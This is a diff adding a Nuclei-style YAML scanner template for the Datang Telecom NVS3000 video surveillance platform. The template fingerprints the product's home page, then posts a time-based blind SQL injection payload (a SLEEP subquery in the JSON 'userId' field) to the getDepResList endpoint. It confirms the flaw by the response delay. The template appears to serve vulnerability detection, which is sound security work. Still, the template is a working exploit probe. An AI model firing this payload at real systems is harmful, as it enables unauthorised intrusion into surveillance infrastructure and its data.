@@ -1,0 +1,54 @@
+id: poc-datang-dianxin-nvs3000-getdepreslist-sqli
+info:
+  name: 大唐电信NVS3000综合视频监控平台 getDepResList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability identified in the getDepResList endpoint of the 大唐电信NVS3000 Comprehensive Video Surveillance Platform.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "NVS3000综合视频监控平台"
+        part: body
+
+  - raw:
+      - |
+        POST /nvsthird/getDepResList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"userId":"1' AND (SELECT 8845 FROM (SELECT(SLEEP({{t1}})))KRNM) AND 'JWDU'='JWDU"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"errorMsg":"OK","group":null}'
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
